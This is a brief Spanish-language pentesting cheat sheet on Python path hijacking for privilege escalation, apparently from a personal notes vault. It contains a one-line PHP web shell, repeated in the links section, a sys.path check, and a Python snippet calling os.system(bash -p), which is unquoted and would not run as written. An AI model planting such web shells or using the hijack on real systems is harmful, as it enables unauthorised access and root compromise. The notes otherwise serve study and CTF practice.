---
tipo: cheatsheet
tags: [python-hijacking, privilege-escalation, webshell, rce, sys-path]
actualizado: 2026-05-28
---

# Python Hijacking — Path Privilege Escalation

#WebShell #RCE #EthicalHacking #CyberSecurity #Pentesting #InfoSec #CommandInjection #SecurityTesting #RedTeam #Exploit #HackingÉtico #Python #PHP #PrivilegeEscalation #ReverseShell #CyberAttack #PenetrationTesting #CTF #BugBounty #Vulnerability #BlackBoxTesting #SecurityResearch #HackThePlanet #OSCommandInjection #CyberSecCommunity #ExploitDevelopment

---

<?php echo shell_exec($_GET['cmd']); ?>


`python3 -c "import sys; print(sys.path)"`


```python
import os

os.system(bash -p) 
```


---

## Navegación

- ⬆️ Carpeta: [[index|4- privilege scalation]]
- ⬅️ Anterior: [[1- privilege scalation basic]]

## Relacionadas

- [[1- privilege scalation basic]] — checklist general y otros vectores.
- [[2- escalada de privilegios]] — notas adicionales de privesc en `2- basico`.
- [[../5- shells/2- tipos de shell|Tipos de shell]] — Web Shell (`<?php system($_GET['cmd']);`) es el vector inicial típico.
- [[../5- shells/1- basic shells|Basic shells]] — comandos rápidos de reverse/bind shell.
- [[15- Scapy (En desarrollo)/index|Python/15- Scapy]] — ejemplos avanzados de Python aplicado.
